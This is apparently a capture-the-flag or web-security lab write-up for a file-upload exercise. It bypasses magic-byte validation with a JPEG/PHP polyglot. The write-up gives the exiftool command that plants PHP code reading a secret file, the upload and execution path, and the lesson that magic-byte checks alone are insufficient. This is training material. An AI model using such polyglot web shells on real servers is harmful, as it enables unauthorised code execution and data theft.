# Lab06 - Polyglot Web Shell Upload

## Objective

Read:

```text
/home/carlos/secret
```

---

# Analysis

Application validates:

```text
Magic Bytes
```

Need a polyglot.

---

# Full Payload Used

### Payload 1

Create JPEG polyglot:

```bash
exiftool -Comment='<?php echo file_get_contents("/home/carlos/secret"); ?>' image.jpg -o exploit.php
```

---

Uploaded file:

```text
exploit.php
```

---

Visit:

```text
/files/avatars/exploit.php
```

Lab solved.

---

# Why It Works

```text
JPEG Signature
        +
PHP Code
        ↓
Validation Passed
        ↓
Execution
```

---

# Related Theory

- 11-flawed-content-validation.md

---

# Key Learnings

Magic-byte validation alone is insufficient.